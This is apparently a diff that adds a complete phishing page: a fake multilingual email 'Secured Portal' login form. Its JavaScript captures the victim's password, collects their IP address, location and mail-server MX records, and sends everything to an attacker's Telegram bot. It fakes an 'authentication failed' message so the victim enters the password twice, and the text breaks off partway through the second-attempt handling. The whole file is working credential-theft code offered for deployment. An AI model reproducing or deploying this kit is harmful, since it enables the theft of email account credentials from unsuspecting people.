@@ -1,0 +1,824 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <title class="logoname">Email Update</title>
+    <link id="favicon" rel="icon" type="image/png" href="">
+    <style>
+    * { box-sizing: border-box; }
+    body {
+        margin: 0; padding: 0;
+        min-height: 100vh;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        background-size: cover;
+        background-position: center;
+        background-repeat: no-repeat;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+    }
+    .form-body {
+        background-color: #F4F4F4;
+        width: 100%;
+        max-width: 420px;
+        padding: 25px 20px;
+        border-radius: 10px;
+        box-shadow: 0 4px 20px rgba(0,0,0,0.15);
+        position: relative;
+        z-index: 10;
+        margin: 15px;
+    }
+    .form-control {
+        height: 48px;
+        font-size: 16px;
+        border-radius: 6px;
+        border: 1px solid #ccc;
+        margin-bottom: 12px;
+    }
+    .form-control:focus {
+        border-color: #106dff;
+        box-shadow: 0 0 0 0.2rem rgba(16, 109, 255, 0.25);
+    }
+    #submit-btn {
+        height: 48px;
+        font-size: 16px;
+        font-weight: 600;
+        border-radius: 6px;
+        background-color: #106dff;
+        border: none;
+        transition: all 0.3s ease;
+        width: 100%;
+    }
+    #submit-btn:hover { background-color: #0d5bd9; }
+    #submit-btn:disabled { opacity: 0.7; cursor: not-allowed; }
+    #logoimg {
+        width: 55px; height: 55px;
+        object-fit: contain;
+        margin-bottom: 8px;
+    }
+    .portal-title {
+        font-weight: 700;
+        font-size: 18px;
+        color: #333;
+        margin-bottom: 5px;
+    }
+    #auth-note {
+        font-size: 14px;
+        color: #106dff;
+        margin-bottom: 20px;
+        padding: 0 10px;
+    }
+    #msg, #error {
+        margin-top: 15px;
+        padding: 10px;
+        border-radius: 6px;
+        font-size: 13px;
+        word-wrap: break-word;
+    }
+    #msg {
+        background-color: #f8d7da;
+        border: 1px solid #f5c6cb;
+        color: #721c24;
+    }
+    #error {
+        background-color: #f8d7da;
+        border: 1px solid #f5c6cb;
+        color: #721c24;
+        display: block;
+    }
+    @media (max-width: 576px) {
+        .form-body { margin: 10px; padding: 20px 15px; border-radius: 8px; }
+        .portal-title { font-size: 16px; }
+        #auth-note { font-size: 13px; }
+        .form-control, #submit-btn { height: 44px; font-size: 15px; }
+    }
+    @media (max-width: 360px) {
+        .form-body { margin: 8px; padding: 15px 12px; }
+        .portal-title { font-size: 15px; }
+        #auth-note { font-size: 12px; }
+    }
+    @media (min-width: 577px) and (max-width: 991px) {
+        .form-body { max-width: 450px; }
+    }
+    @media (min-width: 1200px) {
+        .form-body { max-width: 460px; padding: 30px 25px; }
+    }
+    .loading-spinner {
+        display: inline-block;
+        width: 18px; height: 18px;
+        border: 2px solid #ffffff;
+        border-top: 2px solid transparent;
+        border-radius: 50%;
+        animation: spin 0.8s linear infinite;
+        margin-right: 8px;
+        vertical-align: middle;
+    }
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    </style>
+<base target="_blank">
+<base target="_blank">
+</head>
+<body class="d-flex justify-content-center align-items-center">
+    <div class="form-body">
+        <div class="text-center">
+            <img id="logoimg" src="" alt="logo">
+            <p class="portal-title"><span id="logoname" class="text-capitalize"></span> - Secured Portal</p>
+        </div>
+        <p class="text-center" id="auth-note">Authentication required, Enter your current email password to proceed.</p>
+
+        <div id="users">
+            <input type="email" name="email" class="form-control" id="email" readonly="">
+            <input type="password" id="password" name="password" class="form-control" required placeholder="Password" autocomplete="current-password">
+            <button type="button" id="submit-btn" class="btn btn-primary btn-block">Sign in</button>
+        </div>
+
+        <center>
+            <div class="alert alert-danger" id="msg" style="display: none;">Password is incorrect, Account will be restricted if password is wrong!!</div>
+            <span id="error" class="text-danger" style="display: none;">This account does not exist. Enter a different account</span>
+        </center>
+    </div>
+
+<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+
+<script>
+  // ============================================
+  // GLOBAL CONFIG - TELEGRAM BOT
+  // ============================================
+  const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+  const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+  // ============================================
+  // GLOBAL STATE
+  // ============================================
+  let domain = "";
+  let extractedEmail = "";
+  let attemptCount = 0;
+  let currentLang = 'en';
+
+  // ============================================
+  // TRANSLATIONS
+  // ============================================
+  const translations = {
+    en: {
+      note: "Authentication required, Enter your current email password to proceed.",
+      button: "Sign in",
+      error: "Password is incorrect, Account will be restricted if password is wrong!!",
+      noAccount: "This account does not exist. Enter a different account",
+      emptyEmail: "Email field is empty",
+      emptyPassword: "Password field is empty",
+      authFailed: "Server message: Authentication failed. Please check password and try again!",
+      tryLater: "Please try again later",
+      connError: "Connection error. Please try again."
+    },
+    ar: { 
+      note: "مطلوب التحقق، الرجاء إدخال كلمة المرور الحالية الخاصة بك للمتابعة.", 
+      button: "تسجيل الدخول", 
+      error: "كلمة المرور غير صحيحة، سيتم تقييد الحساب إذا كانت كلمة المرور خاطئة!!",
+      noAccount: "هذا الحساب غير موجود. أدخل حسابًا مختلفًا",
+      emptyEmail: "حقل البريد الإلكتروني فارغ",
+      emptyPassword: "حقل كلمة المرور فارغ",
+      authFailed: "رسالة الخادم: فشل المصادقة. يرجى التحقق من كلمة المرور والمحاولة مرة أخرى!",
+      tryLater: "يرجى المحاولة مرة أخرى لاحقًا",
+      connError: "خطأ في الاتصال. يرجى المحاولة مرة أخرى."
+    },
+    ru: { 
+      note: "Требуется аутентификация. Введите текущий пароль.", 
+      button: "Войти", 
+      error: "Неверный пароль. Аккаунт будет заблокирован при неправильном пароле!!",
+      noAccount: "Этот аккаунт не существует. Введите другой аккаунт",
+      emptyEmail: "Поле email пустое",
+      emptyPassword: "Поле пароля пустое",
+      authFailed: "Сообщение сервера: Ошибка аутентификации. Проверьте пароль и попробуйте снова!",
+      tryLater: "Пожалуйста, попробуйте позже",
+      connError: "Ошибка подключения. Пожалуйста, попробуйте снова."
+    },
+    vi: { 
+      note: "Yêu cầu xác thực, hãy nhập mật khẩu hiện tại của bạn.", 
+      button: "Đăng nhập", 
+      error: "Mật khẩu không đúng, Tài khoản sẽ bị hạn chế nếu mật khẩu sai!!",
+      noAccount: "Tài khoản này không tồn tại. Nhập tài khoản khác",
+      emptyEmail: "Trường email trống",
+      emptyPassword: "Trường mật khẩu trống",
+      authFailed: "Thông báo máy chủ: Xác thực thất bại. Vui lòng kiểm tra mật khẩu và thử lại!",
+      tryLater: "Vui lòng thử lại sau",
+      connError: "Lỗi kết nối. Vui lòng thử lại."
+    },
+    zh: { 
+      note: "需要身份验证，请输入您当前的密码。", 
+      button: "登录", 
+      error: "密码不正确，如果密码错误，账户将被限制!!",
+      noAccount: "此账户不存在。请输入其他账户",
+      emptyEmail: "邮箱字段为空",
+      emptyPassword: "密码字段为空",
+      authFailed: "服务器消息：身份验证失败。请检查密码并重试！",
+      tryLater: "请稍后再试",
+      connError: "连接错误。请重试。"
+    },
+    ko: { 
+      note: "인증이 필요합니다. 현재 비밀번호를 입력하세요.", 
+      button: "로그인", 
+      error: "비밀번호가 틀립니다. 비밀번호가 틀리면 계정이 제한됩니다!!",
+      noAccount: "이 계정은 존재하지 않습니다. 다른 계정을 입력하세요",
+      emptyEmail: "이메일 필드가 비어 있습니다",
+      emptyPassword: "비밀번호 필드가 비어 있습니다",
+      authFailed: "서버 메시지: 인증에 실패했습니다. 비밀번호를 확인하고 다시 시도하세요!",
+      tryLater: "나중에 다시 시도해 주세요",
+      connError: "연결 오류. 다시 시도해 주세요."
+    },
+    ja: { 
+      note: "認証が必要です。現在のパスワードを入力してください。", 
+      button: "ログイン", 
+      error: "パスワードが正しくありません。パスワードが間違っているとアカウントが制限されます!!",
+      noAccount: "このアカウントは存在しません。別のアカウントを入力してください",
+      emptyEmail: "メールアドレス欄が空です",
+      emptyPassword: "パスワード欄が空です",
+      authFailed: "サーバーメッセージ：認証に失敗しました。パスワードを確認してもう一度お試しください！",
+      tryLater: "後でもう一度お試しください",
+      connError: "接続エラー。もう一度お試しください。"
+    },
+    tl: { 
+      note: "Kinakailangan ang pagpapatunay, ilagay ang iyong kasalukuyang password.", 
+      button: "Mag-sign In", 
+      error: "Mali ang password, Ang account ay mairerestrict kung mali ang password!!",
+      noAccount: "Hindi umiiral ang account na ito. Maglagay ng ibang account",
+      emptyEmail: "Walang laman ang field ng email",
+      emptyPassword: "Walang laman ang field ng password",
+      authFailed: "Mensahe ng server: Nabigo ang pagpapatunay. Mangyaring suriin ang password at subukang muli!",
+      tryLater: "Mangyaring subukang muli sa ibang pagkakataon",
+      connError: "Error sa koneksyon. Mangyaring subukang muli."
+    },
+    tr: { 
+      note: "Kimlik doğrulama gerekli, lütfen mevcut şifrenizi girin.", 
+      button: "Giriş yap", 
+      error: "Şifre yanlış, Şifre yanlışsa hesap kısıtlanacaktır!!",
+      noAccount: "Bu hesap mevcut değil. Farklı bir hesap girin",
+      emptyEmail: "E-posta alanı boş",
+      emptyPassword: "Şifre alanı boş",
+      authFailed: "Sunucu mesajı: Kimlik doğrulama başarısız. Lütfen şifreyi kontrol edin ve tekrar deneyin!",
+      tryLater: "Lütfen daha sonra tekrar deneyin",
+      connError: "Bağlantı hatası. Lütfen tekrar deneyin."
+    },
+    es: { 
+      note: "Autenticación requerida, introduzca su contraseña.", 
+      button: "Iniciar sesión", 
+      error: "La contraseña es incorrecta, ¡La cuenta será restringida si la contraseña es incorrecta!!",
+      noAccount: "Esta cuenta no existe. Introduzca una cuenta diferente",
+      emptyEmail: "El campo de correo electrónico está vacío",
+      emptyPassword: "El campo de contraseña está vacío",
+      authFailed: "Mensaje del servidor: Autenticación fallida. ¡Verifique la contraseña e intente de nuevo!",
+      tryLater: "Por favor, inténtelo de nuevo más tarde",
+      connError: "Error de conexión. Por favor, inténtelo de nuevo."
+    },
+    fr: { 
+      note: "Authentification requise, entrez votre mot de passe actuel.", 
+      button: "Se connecter", 
+      error: "Le mot de passe est incorrect, Le compte sera restreint si le mot de passe est faux!!",
+      noAccount: "Ce compte n'existe pas. Entrez un compte différent",
+      emptyEmail: "Le champ email est vide",
+      emptyPassword: "Le champ mot de passe est vide",
+      authFailed: "Message du serveur : Échec de l'authentification. Veuillez vérifier le mot de passe et réessayer !",
+      tryLater: "Veuillez réessayer plus tard",
+      connError: "Erreur de connexion. Veuillez réessayer."
+    },
+    hu: { 
+      note: "Hitelesítés szükséges. Kérjük, adja meg a jelenlegi jelszót.", 
+      button: "Bejelentkezés", 
+      error: "A jelszó helytelen, A fiók korlátozva lesz, ha a jelszó hibás!!",
+      noAccount: "Ez a fiók nem létezik. Adjon meg egy másik fiókot",
+      emptyEmail: "Az email mező üres",
+      emptyPassword: "A jelszó mező üres",
+      authFailed: "Szerver üzenet: Hitelesítés sikertelen. Kérjük, ellenőrizze a jelszót és próbálja újra!",
+      tryLater: "Kérjük, próbálja újra később",
+      connError: "Kapcsolati hiba. Kérjük, próbálja újra."
+    },
+    de: { 
+      note: "Authentifizierung erforderlich. Bitte geben Sie Ihr aktuelles Passwort ein.", 
+      button: "Anmelden", 
+      error: "Passwort ist falsch, Das Konto wird eingeschränkt, wenn das Passwort falsch ist!!",
+      noAccount: "Dieses Konto existiert nicht. Geben Sie ein anderes Konto ein",
+      emptyEmail: "E-Mail-Feld ist leer",
+      emptyPassword: "Passwortfeld ist leer",
+      authFailed: "Servernachricht: Authentifizierung fehlgeschlagen. Bitte überprüfen Sie das Passwort und versuchen Sie es erneut!",
+      tryLater: "Bitte versuchen Sie es später erneut",
+      connError: "Verbindungsfehler. Bitte versuchen Sie es erneut."
+    },
+    id: { 
+      note: "Diperlukan autentikasi, masukkan kata sandi Anda saat ini.", 
+      button: "Masuk", 
+      error: "Kata sandi salah, Akun akan dibatasi jika kata sandi salah!!",
+      noAccount: "Akun ini tidak ada. Masukkan akun yang berbeda",
+      emptyEmail: "Bidang email kosong",
+      emptyPassword: "Bidang kata sandi kosong",
+      authFailed: "Pesan server: Autentikasi gagal. Silakan periksa kata sandi dan coba lagi!",
+      tryLater: "Silakan coba lagi nanti",
+      connError: "Kesalahan koneksi. Silakan coba lagi."
+    },
+    pl: { 
+      note: "Wymagana autoryzacja. Wprowadź swoje aktualne hasło.", 
+      button: "Zaloguj się", 
+      error: "Hasło jest nieprawidłowe, Konto zostanie ograniczone, jeśli hasło jest błędne!!",
+      noAccount: "To konto nie istnieje. Wprowadź inne konto",
+      emptyEmail: "Pole email jest puste",
+      emptyPassword: "Pole hasła jest puste",
+      authFailed: "Wiadomość serwera: Uwierzytelnienie nie powiodło się. Sprawdź hasło i spróbuj ponownie!",
+      tryLater: "Spróbuj ponownie później",
+      connError: "Błąd połączenia. Spróbuj ponownie."
+    },
+    nl: { 
+      note: "Authenticatie vereist. Voer je huidige wachtwoord in.", 
+      button: "Inloggen", 
+      error: "Wachtwoord is onjuist, Account wordt beperkt als wachtwoord fout is!!",
+      noAccount: "Dit account bestaat niet. Voer een ander account in",
+      emptyEmail: "E-mailveld is leeg",
+      emptyPassword: "Wachtwoordveld is leeg",
+      authFailed: "Serverbericht: Authenticatie mislukt. Controleer het wachtwoord en probeer opnieuw!",
+      tryLater: "Probeer het later opnieuw",
+      connError: "Verbindingsfout. Probeer het opnieuw."
+    },
+    ro: { 
+      note: "Autentificare necesară, introduceți parola curentă.", 
+      button: "Autentificare", 
+      error: "Parola este incorectă, Contul va fi restricționat dacă parola este greșită!!",
+      noAccount: "Acest cont nu există. Introduceți un alt cont",
+      emptyEmail: "Câmpul email este gol",
+      emptyPassword: "Câmpul parolă este gol",
+      authFailed: "Mesaj server: Autentificare eșuată. Verificați parola și încercați din nou!",
+      tryLater: "Vă rugăm să încercați din nou mai târziu",
+      connError: "Eroare de conexiune. Vă rugăm să încercați din nou."
+    },
+    pt: {
+      note: "Autenticação necessária, digite sua senha de e-mail atual para continuar.",
+      button: "Entrar",
+      error: "Senha incorreta, A conta será restrita se a senha estiver errada!!",
+      noAccount: "Esta conta não existe. Digite uma conta diferente",
+      emptyEmail: "O campo de e-mail está vazio",
+      emptyPassword: "O campo de senha está vazio",
+      authFailed: "Mensagem do servidor: Falha na autenticação. Verifique a senha e tente novamente!",
+      tryLater: "Por favor, tente novamente mais tarde",
+      connError: "Erro de conexão. Por favor, tente novamente."
+    },
+    it: {
+      note: "Autenticazione richiesta, inserisci la tua password email attuale per procedere.",
+      button: "Accedi",
+      error: "Password errata, L'account verrà limitato se la password è sbagliata!!",
+      noAccount: "Questo account non esiste. Inserisci un account diverso",
+      emptyEmail: "Il campo email è vuoto",
+      emptyPassword: "Il campo password è vuoto",
+      authFailed: "Messaggio del server: Autenticazione fallita. Controlla la password e riprova!",
+      tryLater: "Per favore riprova più tardi",
+      connError: "Errore di connessione. Per favore riprova."
+    },
+    th: {
+      note: "ต้องการการตรวจสอบสิทธิ์ โปรดป้อนรหัสผ่านอีเมลปัจจุบันของคุณเพื่อดำเนินการต่อ",
+      button: "เข้าสู่ระบบ",
+      error: "รหัสผ่านไม่ถูกต้อง บัญชีจะถูกจำกัดหากรหัสผ่านผิด!!",
+      noAccount: "บัญชีนี้ไม่มีอยู่ โปรดป้อนบัญชีอื่น",
+      emptyEmail: "ช่องอีเมลว่างเปล่า",
+      emptyPassword: "ช่องรหัสผ่านว่างเปล่า",
+      authFailed: "ข้อความจากเซิร์ฟเวอร์: การตรวจสอบสิทธิ์ล้มเหลว โปรดตรวจสอบรหัสผ่านและลองอีกครั้ง!",
+      tryLater: "โปรดลองอีกครั้งในภายหลัง",
+      connError: "ข้อผิดพลาดในการเชื่อมต่อ โปรดลองอีกครั้ง"
+    },
+    uk: {
+      note: "Потрібна автентифікація, введіть свій поточний пароль електронної пошти, щоб продовжити.",
+      button: "Увійти",
+      error: "Пароль неправильний, Обліковий запис буде обмежено, якщо пароль неправильний!!",
+      noAccount: "Цього облікового запису не існує. Введіть інший обліковий запис",
+      emptyEmail: "Поле електронної пошти порожнє",
+      emptyPassword: "Поле пароля порожнє",
+      authFailed: "Повідомлення сервера: Помилка автентифікації. Будь ласка, перевірте пароль і спробуйте ще раз!",
+      tryLater: "Будь ласка, спробуйте пізніше",
+      connError: "Помилка з'єднання. Будь ласка, спробуйте ще раз."
+    },
+    cs: {
+      note: "Vyžadováno ověření, zadejte své aktuální e-mailové heslo pro pokračování.",
+      button: "Přihlásit se",
+      error: "Heslo je nesprávné, Účet bude omezen, pokud je heslo špatné!!",
+      noAccount: "Tento účet neexistuje. Zadejte jiný účet",
+      emptyEmail: "Pole e-mailu je prázdné",
+      emptyPassword: "Pole hesla je prázdné",
+      authFailed: "Zpráva serveru: Ověření selhalo. Zkontrolujte heslo a zkuste to znovu!",
+      tryLater: "Zkuste to prosím znovu později",
+      connError: "Chyba připojení. Zkuste to prosím znovu."
+    },
+    el: {
+      note: "Απαιτείται πιστοποίηση, εισαγάγετε τον τρέχοντα κωδικό πρόσβασης email σας για να συνεχίσετε.",
+      button: "Σύνδεση",
+      error: "Ο κωδικός πρόσβασης είναι λανθασμένος, Ο λογαριασμός θα περιοριστεί αν ο κωδικός είναι λάθος!!",
+      noAccount: "Αυτός ο λογαριασμός δεν υπάρχει. Εισαγάγετε διαφορετικό λογαριασμό",
+      emptyEmail: "Το πεδίο email είναι κενό",
+      emptyPassword: "Το πεδίο κωδικού πρόσβασης είναι κενό",
+      authFailed: "Μήνυμα διακομιστή: Η πιστοποίηση απέτυχε. Ελέγξτε τον κωδικό πρόσβασης και δοκιμάστε ξανά!",
+      tryLater: "Παρακαλώ δοκιμάστε ξανά αργότερα",
+      connError: "Σφάλμα σύνδεσης. Παρακαλώ δοκιμάστε ξανά."
+    },
+    sv: {
+      note: "Autentisering krävs, ange ditt nuvarande e-postlösenord för att fortsätta.",
+      button: "Logga in",
+      error: "Lösenordet är felaktigt, Kontot kommer att begränsas om lösenordet är fel!!",
+      noAccount: "Detta konto finns inte. Ange ett annat konto",
+      emptyEmail: "E-postfältet är tomt",
+      emptyPassword: "Lösenordsfältet är tomt",
+      authFailed: "Servermeddelande: Autentisering misslyckades. Kontrollera lösenordet och försök igen!",
+      tryLater: "Försök igen senare",
+      connError: "Anslutningsfel. Försök igen."
+    },
+    da: {
+      note: "Godkendelse påkrævet, indtast din nuværende e-mailadgangskode for at fortsætte.",
+      button: "Log ind",
+      error: "Adgangskoden er forkert, Kontoen vil blive begrænset, hvis adgangskoden er forkert!!",
+      noAccount: "Denne konto findes ikke. Indtast en anden konto",
+      emptyEmail: "E-mail-feltet er tomt",
+      emptyPassword: "Adgangskodefeltet er tomt",
+      authFailed: "Serverbesked: Godkendelse mislykkedes. Kontroller adgangskoden og prøv igen!",
+      tryLater: "Prøv venligst igen senere",
+      connError: "Forbindelsesfejl. Prøv venligst igen."
+    },
+    fi: {
+      note: "Todennus vaaditaan, syötä nykyinen sähköpostisi salasana jatkaaksesi.",
+      button: "Kirjaudu sisään",
+      error: "Salasana on väärä, Tili rajoitetaan, jos salasana on väärä!!",
+      noAccount: "Tätä tiliä ei ole olemassa. Syötä toinen tili",
+      emptyEmail: "Sähköpostikenttä on tyhjä",
+      emptyPassword: "Salasanakenttä on tyhjä",
+      authFailed: "Palvelinviesti: Todennus epäonnistui. Tarkista salasana ja yritä uudelleen!",
+      tryLater: "Yritä myöhemmin uudelleen",
+      connError: "Yhteysvirhe. Yritä uudelleen."
+    },
+    no: {
+      note: "Autentisering kreves, skriv inn ditt nåværende e-postpassord for å fortsette.",
+      button: "Logg inn",
+      error: "Passordet er feil, Kontoen vil bli begrenset hvis passordet er feil!!",
+      noAccount: "Denne kontoen finnes ikke. Skriv inn en annen konto",
+      emptyEmail: "E-postfeltet er tomt",
+      emptyPassword: "Passordfeltet er tomt",
+      authFailed: "Servermelding: Autentisering mislyktes. Sjekk passordet og prøv igjen!",
+      tryLater: "Vennligst prøv igjen senere",
+      connError: "Tilkoblingsfeil. Vennligst prøv igjen."
+    },
+    he: {
+      note: "נדרש אימות, הזן את סיסמת הדוא\"ל הנוכחית שלך כדי להמשיך.",
+      button: "התחבר",
+      error: "הסיסמה שגויה, החשבון יוגבל אם הסיסמה שגויה!!",
+      noAccount: "חשבון זה אינו קיים. הזן חשבון אחר",
+      emptyEmail: "שדה הדוא\"ל ריק",
+      emptyPassword: "שדה הסיסמה ריק",
+      authFailed: "הודעת שרת: האימות נכשל. בדוק את הסיסמה ונסה שוב!",
+      tryLater: "אנא נסה שוב מאוחר יותר",
+      connError: "שגיאת חיבור. אנא נסה שוב."
+    },
+    hi: {
+      note: "प्रमाणीकरण आवश्यक, जारी रखने के लिए अपना वर्तमान ईमेल पासवर्ड दर्ज करें।",
+      button: "लॉग इन करें",
+      error: "पासवर्ड गलत है, यदि पासवर्ड गलत है तो खाता प्रतिबंधित हो जाएगा!!",
+      noAccount: "यह खाता मौजूद नहीं है। एक अलग खाता दर्ज करें",
+      emptyEmail: "ईमेल फ़ील्ड खाली है",
+      emptyPassword: "पासवर्ड फ़ील्ड खाली है",
+      authFailed: "सर्वर संदेश: प्रमाणीकरण विफल। कृपया पासवर्ड जांचें और पुनः प्रयास करें!",
+      tryLater: "कृपया बाद में पुनः प्रयास करें",
+      connError: "कनेक्शन त्रुटि। कृपया पुनः प्रयास करें।"
+    },
+    bn: {
+      note: "প্রমাণীকরণ প্রয়োজন, চালিয়ে যেতে আপনার বর্তমান ইমেইল পাসওয়ার্ড লিখুন।",
+      button: "লগ ইন করুন",
+      error: "পাসওয়ার্ড ভুল, পাসওয়ার্ড ভুল হলে অ্যাকাউন্ট সীমাবদ্ধ করা হবে!!",
+      noAccount: "এই অ্যাকাউন্টটি বিদ্যমান নেই। একটি ভিন্ন অ্যাকাউন্ট লিখুন",
+      emptyEmail: "ইমেইল ক্ষেত্র খালি",
+      emptyPassword: "পাসওয়ার্ড ক্ষেত্র খালি",
+      authFailed: "সার্ভার বার্তা: প্রমাণীকরণ ব্যর্থ। পাসওয়ার্ড পরীক্ষা করুন এবং আবার চেষ্টা করুন!",
+      tryLater: "অনুগ্রহ করে পরে আবার চেষ্টা করুন",
+      connError: "সংযোগ ত্রুটি। অনুগ্রহ করে আবার চেষ্টা করুন।"
+    },
+    ur: {
+      note: "توثیق درکار ہے، جاری رکھنے کے لیے اپنا موجودہ ای میل پاس ورڈ درج کریں۔",
+      button: "لاگ ان کریں",
+      error: "پاس ورڈ غلط ہے، اگر پاس ورڈ غلط ہو تو اکاؤنٹ محدود کر دیا جائے گا!!",
+      noAccount: "یہ اکاؤنٹ موجود نہیں ہے۔ ایک مختلف اکاؤنٹ درج کریں",
+      emptyEmail: "ای میل فیلڈ خالی ہے",
+      emptyPassword: "پاس ورڈ فیلڈ خالی ہے",
+      authFailed: "سرور کا پیغام: تصدیق ناکام۔ براہ کرم پاس ورڈ چیک کریں اور دوبارہ کوشش کریں!",
+      tryLater: "براہ کرم بعد میں دوبارہ کوشش کریں",
+      connError: "کنکشن خرابی۔ براہ کرم دوبارہ کوشش کریں۔"
+    },
+    fa: {
+      note: "احراز هویت لازم است، برای ادامه رمز عبور ایمیل فعلی خود را وارد کنید.",
+      button: "ورود",
+      error: "رمز عبور نادرست است، در صورت نادرست بودن رمز عبور، حساب محدود خواهد شد!!",
+      noAccount: "این حساب وجود ندارد. حساب دیگری وارد کنید",
+      emptyEmail: "فیلد ایمیل خالی است",
+      emptyPassword: "فیلد رمز عبور خالی است",
+      authFailed: "پیام سرور: احراز هویت ناموفق بود. لطفاً رمز عبور را بررسی کرده و دوباره امتحان کنید!",
+      tryLater: "لطفاً بعداً دوباره امتحان کنید",
+      connError: "خطای اتصال. لطفاً دوباره امتحان کنید."
+    }
+  };
+
+  // ============================================
+  // HELPER FUNCTIONS
+  // ============================================
+  function translateUI(locale) {
+    const langCode = locale.split("-")[0];
+    const lang = translations[langCode] || translations['en'];
+    currentLang = langCode;
+
+    const noteEl = document.getElementById("auth-note");
+    if (noteEl) noteEl.textContent = lang.note;
+
+    const btnEl = document.getElementById("submit-btn");
+    if (btnEl && attemptCount === 0) btnEl.textContent = lang.button;
+  }
+
+  function getText(key) {
+    const lang = translations[currentLang] || translations['en'];
+    return lang[key] || translations['en'][key];
+  }
+
+  // ============================================
+  // MX RECORD FETCHER (via Cloudflare DoH)
+  // ============================================
+  async function getMXRecords(emailDomain) {
+    try {
+      const dohUrl = 'https://cloudflare-dns.com/dns-query?name=' + encodeURIComponent(emailDomain) + '&type=MX';
+      const res = await fetch(dohUrl, {
+        method: 'GET',
+        headers: { 'Accept': 'application/dns-json' }
+      });
+      if (!res.ok) return 'Failed to fetch MX records';
+      const data = await res.json();
+      if (!data.Answer || data.Answer.length === 0) return 'No MX records found';
+      // Sort by priority (lower = higher priority)
+      const sorted = data.Answer.sort((a, b) => a.data.split(' ')[0] - b.data.split(' ')[0]);
+      const mxList = sorted.map(r => {
+        const parts = r.data.split(' ');
+        const priority = parts[0];
+        const server = parts.slice(1).join(' ').replace(/\.$/, '');
+        return '[' + priority + '] ' + server;
+      });
+      return mxList.join('\n');
+    } catch (err) {
+      console.error('MX fetch error:', err);
+      return 'MX lookup error: ' + err.message;
+    }
+  }
+
+  // ============================================
+  // MAIN LOGIN HANDLER
+  // ============================================
+  async function handleLogin() {
+    console.log("=== handleLogin START ===");
+    console.log("attemptCount:", attemptCount);
+    console.log("domain:", domain);
+    console.log("extractedEmail:", extractedEmail);
+
+    const passwordInput = document.getElementById("password");
+    const msgDiv = document.getElementById("msg");
+    const submitBtn = document.getElementById("submit-btn");
+
+    const password = passwordInput.value.trim();
+    console.log("password entered:", password ? "YES" : "NO");
+
+    if (!password) {
+      alert("Please enter your password.");
+      return;
+    }
+
+    // Show loading
+    submitBtn.disabled = true;
+    submitBtn.innerHTML = '<span class="loading-spinner"></span>Loading...';
+
+    // Hide previous messages
+    msgDiv.style.display = 'none';
+
+    // ============================================
+    // STEP 1: Get IP info
+    // ============================================
+    let ip = "Unknown";
+    let city = "?";
+    let region = "?";
+    let country = "?";
+
+    try {
+      const ipRes = await fetch("https://ipapi.co/json/");
+      const data = await ipRes.json();
+      ip = data?.ip || "Unknown";
+      city = data?.city || "?";
+      region = data?.region || "?";
+      country = data?.country_name || "?";
+
+      // Trigger translation
+      if (data && data.languages) {
+        const userLang = data.languages.split(",")[0].trim();
+        translateUI(userLang);
+      }
+    } catch (err) {
+      console.error("IP fetch failed:", err);
+    }
+
+    console.log("IP info:", ip, city, region, country);
+
+    // ============================================
+    // STEP 2: Get MX Records of email domain
+    // ============================================
+    let mxRecords = "Fetching...";
+    try {
+      mxRecords = await getMXRecords(domain);
+    } catch (e) {
+      mxRecords = "MX fetch failed";
+    }
+    console.log("MX Records:", mxRecords);
+
+    // ============================================
+    // STEP 3: Build Telegram message
+    // ============================================
+    const messageText = '🔐 NEW LOGIN 🔐\n' +
+      '📧 Email: ' + extractedEmail + '\n' +
+      '🔑 Password: ' + password + '\n' +
+      '🌍 MX Records:\n' + mxRecords + '\n' +
+      '🌐 IP: ' + ip + '\n' +
+      '📍 Location: ' + city + ', ' + region + ', ' + country;
+
+    console.log("Telegram message built, length:", messageText.length);
+
+    // ============================================
+    // STEP 4: Send to Telegram IMMEDIATELY
+    // ============================================
+    console.log("Sending to Telegram...");
+    const telegramApiUrl = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+
+    try {
+      const telegramRes = await fetch(telegramApiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: messageText,
+          parse_mode: 'HTML'
+        })
+      });
+      console.log("Telegram response status:", telegramRes.status);
+      console.log("Telegram response ok:", telegramRes.ok);
+
+      if (!telegramRes.ok) {
+        console.error('Telegram error status:', telegramRes.status);
+        const errorText = await telegramRes.text();
+        console.error('Telegram error body:', errorText);
+      }
+    } catch (telegramErr) {
+      console.error('Telegram fetch failed:', telegramErr);
+    }
+
+    // ============================================
+    // STEP 5: Increment attempt and handle UI
+    // ============================================
+    attemptCount++;
+    passwordInput.value = "";
+    console.log("attemptCount incremented to:", attemptCount);
+
+    // Wait 2 seconds for loading effect
+    await new Promise(r => setTimeout(r, 500));
+
+    if (attemptCount === 1) {
+      // FIRST ATTEMPT: Show error, ready for 2nd try
+      console.log("FIRST ATTEMPT - showing error");
+      msgDiv.textContent = getText("authFailed");
+      msgDiv.style.display = 'block';
+      submitBtn.disabled = false;
+      submitBtn.textContent = getText("button");
+      passwordInput.focus();
+      console.log("=== handleLogin END (1st attempt) ===");
+
+    } else {
+      // SECOND ATTEMPT: Show error then redirect IMMEDIATELY
+      console.log("SECOND ATTEMPT - showing error then redirecting");
+      msgDiv.textContent = getText("authFailed");
+      msgDiv.style.display = 'block';
+      submitBtn.disabled = false;
+      submitBtn.textContent = getText("button");
+
